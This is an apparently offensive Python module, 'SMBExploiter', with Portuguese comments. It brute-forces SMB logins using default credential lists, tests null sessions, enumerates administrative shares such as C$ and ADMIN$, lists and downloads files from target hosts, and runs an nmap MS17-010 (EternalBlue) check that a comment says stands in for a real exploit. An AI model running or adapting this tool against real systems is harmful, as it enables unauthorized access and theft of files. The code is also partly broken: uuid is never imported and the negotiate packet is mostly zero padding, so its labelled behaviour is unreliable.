# modules/network/smb.py
import socket
import subprocess
import tempfile
import os
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import Tree
from smbprotocol.open import Open, FilePipePrinterAccessMask
from smbprotocol.file_info import FileInfoClass
from smbprotocol.create_contexts import CreateContextName
from smbprotocol.exceptions import SMBException
import threading
from concurrent.futures import ThreadPoolExecutor

class SMBExploiter:
    def __init__(self):
        self.common_shares = ['C$', 'D$', 'ADMIN$', 'IPC$', 'PRINT$', 'FAX$', 'SYSVOL', 'NETLOGON']
        self.common_users = ['Administrator', 'Guest', 'admin', 'user', 'test']
        self.common_passwords = ['', '123456', 'password', 'admin', '12345', 'Welcome1', 'Password1']

    def smb_connect(self, target, username, password, domain='WORKGROUP', timeout=5):
        """Tenta conexão SMB"""
        try:
            conn = Connection(uuid.uuid4(), target, 445)
            conn.connect(timeout=timeout)
            
            session = Session(conn, username=username, password=password, require_encryption=False)
            session.connect()
            
            return conn, session
        except Exception as e:
            return None, None

    def enumerate_shares(self, target, username, password):
        """Enumera shares SMB"""
        shares_found = []
        conn, session = self.smb_connect(target, username, password)
        
        if session:
            try:
                # Lista shares
                tree = Tree(session, "IPC$")
                tree.connect()
                
                # Tenta conectar a shares comuns
                for share in self.common_shares:
                    try:
                        test_tree = Tree(session, share)
                        test_tree.connect()
                        shares_found.append(share)
                        test_tree.disconnect()
                    except:
                        continue
                
                tree.disconnect()
            except:
                pass
            finally:
                session.disconnect()
                conn.disconnect()
        
        return shares_found

    def brute_force_smb(self, target):
        """Força bruta SMB"""
        valid_creds = []
        
        for user in self.common_users:
            for password in self.common_passwords:
                conn, session = self.smb_connect(target, user, password)
                if session:
                    valid_creds.append((user, password))
                    print(f"[+] SMB Credencial: {user}:{password}")
                    session.disconnect()
                    conn.disconnect()
        
        return valid_creds

    def check_null_session(self, target):
        """Verifica sessão nula"""
        try:
            conn, session = self.smb_connect(target, '', '')
            if session:
                shares = self.enumerate_shares(target, '', '')
                session.disconnect()
                conn.disconnect()
                return True, shares
        except:
            pass
        return False, []

    def smb_version_scan(self, target):
        """Detecta versão do SMB"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, 445))
            
            # Envia pacote SMB negotiate
            negotiate_packet = bytes.fromhex(
                '00000085ff534d4272000000001853c800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
            )
            s.send(negotiate_packet)
            
            response = s.recv(1024)
            s.close()
            
            if response:
                # Extrai versão do SMB da resposta
                if b'SMB' in response:
                    return "SMB detected"
                    
        except:
            pass
        return "Unknown"

    def exploit_eternal_blue(self, target):
        """Tenta exploit EternalBlue (MS17-010)"""
        try:
            # Verifica se a porta 445 está aberta
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            result = s.connect_ex((target, 445))
            s.close()
            
            if result == 0:
                # Comando básico de verificação (substituir por exploit real)
                cmd = f"nmap -p 445 --script smb-vuln-ms17-010 {target}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                if "VULNERABLE" in result.stdout:
                    return True, "EternalBlue vulnerability detected"
                    
        except:
            pass
        return False, "Not vulnerable"

    def list_share_contents(self, target, username, password, share):
        """Lista conteúdo de share"""
        try:
            conn, session = self.smb_connect(target, username, password)
            if not session:
                return []
            
            tree = Tree(session, share)
            tree.connect()
            
            # Lista arquivos no root do share
            files = []
            try:
                open_file = Open(tree, "\\")
                file_list = open_file.query_directory("*", FileInfoClass.FILE_BOTH_DIRECTORY_INFO)
                
                for file_info in file_list:
                    filename = file_info['file_name'].get_value().decode('utf-8', errors='ignore')
                    if filename not in ['.', '..']:
                        files.append(filename)
                        
            except:
                pass
            
            tree.disconnect()
            session.disconnect()
            conn.disconnect()
            
            return files
            
        except:
            return []

    def download_file(self, target, username, password, share, remote_path, local_path):
        """Download de arquivo via SMB"""
        try:
            conn, session = self.smb_connect(target, username, password)
            if not session:
                return False
            
            tree = Tree(session, share)
            tree.connect()
            
            with Open(tree, remote_path, desired_access=FilePipePrinterAccessMask.GENERIC_READ) as file:
                with open(local_path, 'wb') as f:
                    while True:
                        data = file.read(4096)
                        if not data:
                            break
                        f.write(data)
            
            tree.disconnect()
            session.disconnect()
            conn.disconnect()
            
            return True
            
        except:
            return False

    def scan_smb(self, target):
        """Scan completo SMB"""
        print(f"[+] Scan SMB em: {target}")
        
        results = {
            'null_session': False,
            'shares': [],
            'credentials': [],
            'vulnerabilities': [],
            'version': None
        }
        
        # Verifica versão
        results['version'] = self.smb_version_scan(target)
        
        # Verifica sessão nula
        null_session, shares = self.check_null_session(target)
        results['null_session'] = null_session
        if null_session:
            results['shares'] = shares
            print(f"[!] NULL SESSION VULNERÁVEL: {target}")
        
        # Força bruta
        results['credentials'] = self.brute_force_smb(target)
        
        # Verifica EternalBlue
        is_vuln, vuln_info = self.exploit_eternal_blue(target)
        if is_vuln:
            results['vulnerabilities'].append(vuln_info)
        
        return results